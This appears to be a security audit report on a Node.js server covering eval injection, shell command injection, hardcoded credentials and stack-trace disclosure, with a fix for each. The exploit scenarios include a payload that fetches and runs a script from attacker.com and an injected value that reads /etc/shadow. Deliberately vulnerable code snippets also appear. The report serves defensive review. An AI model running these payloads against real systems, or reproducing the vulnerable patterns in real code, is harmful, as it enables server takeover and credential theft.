# Vuln 1: Remote Code Execution via `eval()`: `src/index.js:32`

* **Severity:** Critical
* **Category:** `eval_injection`
* **Description:** The `/api/search` endpoint takes the raw `q` query parameter and passes it directly to `eval()` without any validation or sanitization. This allows any unauthenticated caller to execute arbitrary JavaScript on the server.
* **Exploit Scenario:**
  ```
  GET /api/search?q=require('child_process').execSync('curl+attacker.com/shell.sh|sh')
  ```
  The Node.js process executes the attacker's payload with full server privileges — file system access, network calls, credential exfiltration, reverse shells.
* **Vulnerable Code:**
  ```javascript
  const query = url.searchParams.get('q');
  const filter = eval('(' + query + ')');  // line 32
  ```
* **Recommendation:** Remove `eval()` entirely. Define a safe, structured filter schema and parse input with `JSON.parse` inside a try/catch, or use a purpose-built query library. Never pass user input to `eval()`, `new Function()`, or `vm.runInThisContext()`.

# Vuln 2: OS Command Injection via `exec()`: `src/index.js:38`

* **Severity:** Critical
* **Category:** `command_injection`
* **Description:** The `/api/user` endpoint passes the `id` query parameter directly into a shell command string via `child_process.exec()`. Because `exec()` runs commands through a shell (`/bin/sh -c`), all shell metacharacters in the user-supplied value are interpreted.
* **Exploit Scenario:**
  ```
  GET /api/user?id=;+cat+/etc/shadow
  ```
  This executes: `grep ; cat /etc/shadow /etc/passwd` — the `cat /etc/shadow` command runs independently and its output is accessible or can be exfiltrated. An attacker could also inject reverse shell payloads.
* **Vulnerable Code:**
  ```javascript
  const userId = url.searchParams.get('id');
  exec(`grep ${userId} /etc/passwd`, (err, stdout) => {  // line 38
    res.writeHead(200);
    res.end(JSON.stringify({ data: stdout }));
  });
  ```
* **Recommendation:** Replace `exec()` with `execFile()` and pass arguments as an array — this bypasses the shell entirely:
  ```javascript
  const { execFile } = require('child_process');
  execFile('grep', [userId, '/etc/passwd'], (err, stdout) => { ... });
  ```
  Additionally, validate `userId` against a strict allowlist (e.g., `/^\d+$/`) before use. Reading `/etc/passwd` to look up users is also a suspicious design — prefer a proper database.

# Vuln 3: Hardcoded Credentials in Source Code: `src/index.js:9-10`

* **Severity:** High
* **Category:** `hardcoded_secrets`
* **Description:** Production credentials are hardcoded as string literals at module scope and committed to git. Anyone with repository access — including all git history — can retrieve these values. The string `sk-prod-abc123supersecretkey` explicitly indicates a production API secret.
* **Vulnerable Code:**
  ```javascript
  const DB_PASSWORD = 'admin123';                        // line 9
  const API_SECRET = 'sk-prod-abc123supersecretkey';     // line 10
  console.log('Starting server with secret:', API_SECRET); // line 13
  ```
  The `console.log` on line 13 additionally emits the secret to stdout, log aggregators, CI/CD output, and any connected observability tooling — a separate, concrete exposure path per OWASP A09.
* **Exploit Scenario:** An attacker with read access to the repository, a CI/CD log dump, or a container stdout stream gains the raw production API key and database password without any further exploitation.
* **Recommendation:**
  1. Rotate both credentials immediately — they are compromised as of this commit.
  2. Replace with environment variables:
     ```javascript
     const DB_PASSWORD = process.env.DB_PASSWORD;
     const API_SECRET = process.env.API_SECRET;
     ```
  3. Remove the `console.log` of `API_SECRET`.
  4. Add `.env` to `.gitignore` if not already present, and add a secrets-scanning step (e.g., `git-secrets`, `truffleHog`) to the CI pipeline.

# Vuln 4: Stack Trace Exposed in HTTP Response: `src/index.js:65`

* **Severity:** Medium
* **Category:** `information_disclosure`
* **Description:** The `POST /api/chat` error handler serializes `error.stack` directly into the JSON response returned to clients. The Node.js stack trace includes absolute file system paths, internal module paths, and line numbers, giving attackers a detailed map of the server's internals.
* **Exploit Scenario:**
  ```
  curl -X POST -H "Content-Type: application/json" -d '{invalid' http://localhost:3000/api/chat
  ```
  Response:
  ```json
  { "error": "Invalid JSON provided", "stack": "SyntaxError: ...\n    at /Users/nithin/Documents/.../src/index.js:52:..." }
  ```
  This aids targeted follow-on attacks by revealing exact file paths, framework internals, and code structure.
* **Vulnerable Code:**
  ```javascript
  res.writeHead(400);
  res.end(JSON.stringify({ error: 'Invalid JSON provided', stack: error.stack })); // line 65
  ```
* **Recommendation:** Log the full error server-side and return only a generic message to the client:
  ```javascript
  console.error('JSON parse error:', error);
  res.writeHead(400);
  res.end(JSON.stringify({ error: 'Invalid JSON provided' }));
  ```
